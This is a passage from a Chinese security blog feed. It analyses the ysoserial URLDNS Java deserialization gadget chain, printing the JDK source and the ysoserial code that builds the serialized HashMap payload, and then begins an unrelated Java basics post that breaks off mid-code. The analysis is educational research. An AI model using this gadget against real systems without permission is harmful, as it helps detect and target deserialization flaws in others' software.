></p><ul><li><p>跟进<code>hash</code>方法后，因为<code>key</code>不为空，发现里面的<code>hashCode</code>方法，那么继续跟进。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>这里是<code>java.net.URL</code>对象，因此跟进到<code>URL.java</code>的898行，当时的<code>hashCode</code>值为<code>-1</code>，因此进入下面的<code>handler</code>的<code>hashCode</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>handler</code>又是<code>URLStreamHandler</code>的对象，于是乎跟进<code>URLStreamHandler</code>的第<code>350</code>行，这里的参数<code>u</code>则是我们刚才传递的<code>URL</code>对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the protocol part.</span></span><br><span class="line">        String protocol = u.getProtocol();</span><br><span class="line">        <span class="keyword">if</span> (protocol != <span class="keyword">null</span>)</span><br><span class="line">            h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the host part.</span></span><br><span class="line">        InetAddress addr = getHostAddress(u);</span><br><span class="line">        <span class="keyword">if</span> (addr != <span class="keyword">null</span>) &#123;</span><br><span class="line">            h += addr.hashCode();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String host = u.getHost();</span><br><span class="line">            <span class="keyword">if</span> (host != <span class="keyword">null</span>)</span><br><span class="line">                h += host.toLowerCase().hashCode();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the file part.</span></span><br><span class="line">        String file = u.getFile();</span><br><span class="line">        <span class="keyword">if</span> (file != <span class="keyword">null</span>)</span><br><span class="line">            h += file.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the port part.</span></span><br><span class="line">        <span class="keyword">if</span> (u.getPort() == -<span class="number">1</span>)</span><br><span class="line">            h += getDefaultPort();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            h += u.getPort();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the ref part.</span></span><br><span class="line">        String ref = u.getRef();</span><br><span class="line">        <span class="keyword">if</span> (ref != <span class="keyword">null</span>)</span><br><span class="line">            h += ref.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> h;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>第<code>10</code>行获取<code>host</code>和<code>port</code>跟进。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (u.hostAddress != <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span> u.hostAddress;</span><br><span class="line"></span><br><span class="line">    String host = u.getHost();</span><br><span class="line">    <span class="keyword">if</span> (host == <span class="keyword">null</span> || host.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            u.hostAddress = InetAddress.getByName(host);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownHostException ex) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SecurityException se) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> u.hostAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>InetAddress.getByName</code>则进行一次DNS请求获取，到这里差不多也就结束了。</p></li><li><p><code>gadGet Chain</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HashMap-&gt;readObject()</span><br><span class="line">HashMap-&gt;hash()</span><br><span class="line">URL-&gt;hashCode()</span><br><span class="line">URLStreamHandler-&gt;hashCode()</span><br><span class="line">URLStreamHandler-&gt;getHostAddress()</span><br><span class="line">InetAddress-&gt;getByName()</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://gitee.com/pan3a/image/raw/urldns/URLDNS/10.png"                      alt="image.png"                ></p><h1 id="Ysoseria分析"><a href="#Ysoseria分析" class="headerlink" title="Ysoseria分析"></a>Ysoseria分析</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2></li><li><p>直接用<code>IDEA</code>打开我们克隆下来的项目，由于我有两个<code>Java</code>版本自动把项目配置为<code>JDK14</code>了，因此需要更改JDK版本，打开<code>File</code>-&gt;<code>Project Structure</code>。</p></li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://gitee.com/pan3a/image/raw/urldns/URLDNS/11.png"                      alt="image.png"                ></p><ul><li>有<code>pom.xml</code>得知我们的主类文件是<code>GeneratePayload.java</code>，运行查看环境是否成功。</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://gitee.com/pan3a/image/raw/urldns/URLDNS/12.png"                      alt="image.png"                ></p><ul><li>由于他是命令行获取的参数，因此我们配置当前文件运行参数，或者自己注释获取参数的<code>17-20</code>代码，直接给出传递的参数值，这里就采用配置参数的形式。</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://s4.ax1x.com/2022/01/24/7INwc9.png"                      alt="image.png"                ></p><h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><ul><li><p>这里断点直接放到第<code>9</code>行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (args.length != <span class="number">2</span>) &#123;</span><br><span class="line">printUsage();</span><br><span class="line">System.exit(USAGE_CODE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">final</span> String payloadType = args[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">final</span> String command = args[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Class&lt;? extends ObjectPayload&gt; payloadClass = Utils.getPayloadClass(payloadType);</span><br><span class="line"><span class="keyword">if</span> (payloadClass == <span class="keyword">null</span>) &#123;</span><br><span class="line">System.err.println(<span class="string">&quot;Invalid payload type &#x27;&quot;</span> + payloadType + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">printUsage();</span><br><span class="line">System.exit(USAGE_CODE);</span><br><span class="line"><span class="keyword">return</span>; <span class="comment">// make null analysis happy</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">final</span> ObjectPayload payload = payloadClass.newInstance();</span><br><span class="line"><span class="keyword">final</span> Object object = payload.getObject(command);</span><br><span class="line">PrintStream out = System.out;</span><br><span class="line">Serializer.serialize(object, out);</span><br><span class="line">ObjectPayload.Utils.releasePayload(payload, object);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">System.err.println(<span class="string">&quot;Error while generating or serializing payload&quot;</span>);</span><br><span class="line">e.printStackTrace();</span><br><span class="line">System.exit(INTERNAL_ERROR_CODE);</span><br><span class="line">&#125;</span><br><span class="line">System.exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>来到<code>Utils.getPayloadClass</code>，这里是<code>payloadType</code>则是我们第攻击模块，这里传递的是<code>URLDNS</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;? extends ObjectPayload&gt; getPayloadClass ( <span class="keyword">final</span> String className ) &#123;</span><br><span class="line">     Class&lt;? extends ObjectPayload&gt; clazz = <span class="keyword">null</span>;</span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         clazz = (Class&lt;? extends ObjectPayload&gt;) Class.forName(className);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">catch</span> ( Exception e1 ) &#123;&#125;</span><br><span class="line">     <span class="keyword">if</span> ( clazz == <span class="keyword">null</span> ) &#123;</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">             <span class="keyword">return</span> clazz = (Class&lt;? extends ObjectPayload&gt;) Class</span><br><span class="line">                     .forName(GeneratePayload.class.getPackage().getName() + <span class="string">&quot;.payloads.&quot;</span> + className);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">catch</span> ( Exception e2 ) &#123;&#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">if</span> ( clazz != <span class="keyword">null</span> &amp;&amp; !ObjectPayload.class.isAssignableFrom(clazz) ) &#123;</span><br><span class="line">         clazz = <span class="keyword">null</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> clazz;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></li><li><p>这里就是利用反射来获取我们需要的类，因为是<code>forName</code>因此需要全限定类名，然后返回获取的类，因为可以获取到<code>URLDNS</code>类<code>payloadClass</code>则不为空，进入<code>try</code>代码块。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">final</span> ObjectPayload payload = payloadClass.newInstance();</span><br><span class="line"><span class="keyword">final</span> Object object = payload.getObject(command);</span><br><span class="line">PrintStream out = System.out;</span><br><span class="line">Serializer.serialize(object, out);</span><br><span class="line">ObjectPayload.Utils.releasePayload(payload, object);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>将<code>URLDNS</code>类通过反序列化的方式进行初始化，然后进入<code>getObject</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">        <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">        URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">        HashMap ht = <span class="keyword">new</span> HashMap(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">        URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">        ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ht;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>这里又实例化了<code>SilentURLStreamHandler()</code>，继续向下跟进。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></li><li><p>这里继承了<code>URLStreamHandler</code>，重写了下面两个方法，其中让<code>getHostAddress</code>为空，因此不会触发<code>InetAddress.getByName</code>从而没有<code>DNS</code>请求，对比哈原生<code>URLStreamHandler</code>类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (u.hostAddress != <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> u.hostAddress;</span><br><span class="line"></span><br><span class="line">        String host = u.getHost();</span><br><span class="line">        <span class="keyword">if</span> (host == <span class="keyword">null</span> || host.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                u.hostAddress = InetAddress.getByName(host);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (UnknownHostException ex) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SecurityException se) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> u.hostAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>接下来就是基础的通过反射使<code>URL</code>对象的<code>hashCode</code>值为<code>-1</code>，然后返回对象。再调用<code>Serializer.serialize(object, out)</code>对我们的<code>hashMap</code>对象进行序列化操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> OutputStream out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"><span class="keyword">final</span> ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(out);</span><br><span class="line">objOut.writeObject(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>这里就正常序列化然后调用输出流，<code>ObjectPayload.Utils.releasePayload</code>则是判断<code>URLDNS</code>是否为<code>ReleaseableObjectPayload</code>的一个子类，这个类是是一个接口，定义了一个<code>release</code>方法，然后就结束了，退出程序。</p></li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://gitee.com/pan3a/image/raw/urldns/URLDNS/14.png"                      alt="image.png"                ></p>]]></content>
    
    
    <summary type="html">Java安全之URLDNS分析</summary>
    
    
    
    <category term="JavaSecurity" scheme="https://pan3a.github.io/categories/JavaSecurity/"/>
    
    
  </entry>
  
  <entry>
    <title>Java基础学习</title>
    <link href="https://pan3a.github.io/1/"/>
    <id>https://pan3a.github.io/1/</id>
    <published>2021-11-23T02:51:00.000Z</published>
    <updated>2022-02-23T08:17:51.623Z</updated>
    
    <content type="html"><![CDATA[<ul><li>Java基础的一些知识点。<span id="more"></span></li></ul><h1 id="JavaBasic"><a href="#JavaBasic" class="headerlink" title="JavaBasic"></a>JavaBasic</h1><ul><li>创建的文件名需与类名一致，即<code>HelloWorld.java</code>，严格要求大小写。</li><li>主函数参数可为<code>String args[]</code>与<code>String[] args</code>。</li><li>一个源文件只能有一个<code>public</code>类，且仅为文件名相同的类为<code>public</code>属性。</li><li><code>java</code>文件运行是<code>javac</code>将<code>Hello.java</code>文件编译成<code>Hello.class</code>的字节码，然后由<code>jvm</code>虚拟机对其进行解释执行。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Hello World&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="访问控制符"><a href="#访问控制符" class="headerlink" title="访问控制符"></a>访问控制符</h2><ul><li><code>private</code>，<code>default</code>，<code>protected</code>，<code>public</code>四个标识符。<table><thead><tr><th></th><th>同一个类中</th><th>同一个包中</th><th>(不同包)子类中</th><th>全局范围内</th></tr></thead><tbody><tr><td>private</td><td>✓</td><td></td><td></td><td></td></tr><tr><td>default</td><td>✓</td><td>✓</td><td></td><td></td></tr><tr><td>protected</td><td>✓</td><td>✓</td><td>✓</td><td></td></tr><tr><td>public</td><td>✓</td><td>✓</td><td>✓</td><td>✓</td></tr></tbody></table></li></ul><h3 id="private"><a href="#private" class="headerlink" title="private"></a>private</h3><p><code>private</code>只允许当前类进行访问，继承也无法访问。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccessControlStudy</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age = <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">public</span> String name = <span class="string">&quot;Pan3a&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> String love = <span class="string">&quot;java&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sayAge</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;age:&quot;</span> + Integer.toString(<span class="keyword">this</span>.age) );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sayName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;name:&quot;</span> + <span class="keyword">this</span>.name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sayLove</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;love:&quot;</span> + <span class="keyword">this</span>.love);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">extends</span> <span class="title">AccessControlStudy</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PrivateStudy</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        AccessControlStudy ac = <span class="keyword">new</span> AccessControlStudy();</span><br><span class="line">        Test test = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="comment">//        ac.sayAge();    </span></span><br><span class="line"><span class="comment">//        test.sayAge();  </span></span><br><span class="line"><span class="comment">//       因为private原因，直接无法编译。子类和实例化对象都无法访问。</span></span><br><span class="line">        ac.sayName();</span><br><span class="line">        test.sayName();</span><br><span class="line">        ac.sayLove();</span><br><span class="line">        test.sayLove();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="default"><a href="#default" class="headerlink" title="default"></a>default</h3><ul><li>只能是同一个类或同一个包中访问。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Pan3a.DefaultStudy;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccessControlStudy</span></span>&#123;</span><br><span class="line">    String name = <span class="string">&quot;Pan3a&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>不同的另外一个包</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Pan3a.Class;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccessControlStudyThree</span> </span>&#123;</span><br><span class="line">    String name = <span class="string">&quot;Pan3a&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">SayName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello &quot;</span> + <span class="keyword">this</span>.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>测试文件</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Pan3a.DefaultStudy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.Pan3a.Class.AccessControlStudyThree;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccessControlStudyTwo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">//      同一个包中的default可以使用</span></span><br><span class="line">        com.Pan3a.DefaultStudy.AccessControlStudy ac = <span class="keyword">new</span> com.Pan3a.DefaultStudy.AccessControlStudy();</span><br><span class="line">        System.out.println(ac.name);</span><br><span class="line"></span><br><span class="line"><span class="comment">//      不同包中</span></span><br><span class="line">        com.Pan3a.Class.AccessControlStudyThree three = <span class="keyword">new</span> AccessControlStudyThree();</span><br><span class="line"><span class="comment">//      System.out.println(three.name);</span></span><br><span class="line"><span class="comment">//      因为在不用包中因此调用时语法错误无法编译</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//      因为访问的是AccessControlStudyThree中的SayName方法，变量是实例化的类中因此可访问</span></span><br><span class="line">        three.SayName();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="protected"><a href="#protected" class="headerlink" title="protected"></a>protected</h3><ul><li>同一个类或同一个包或不同包中子类访问。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Pan3a.DefaultStudy;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span 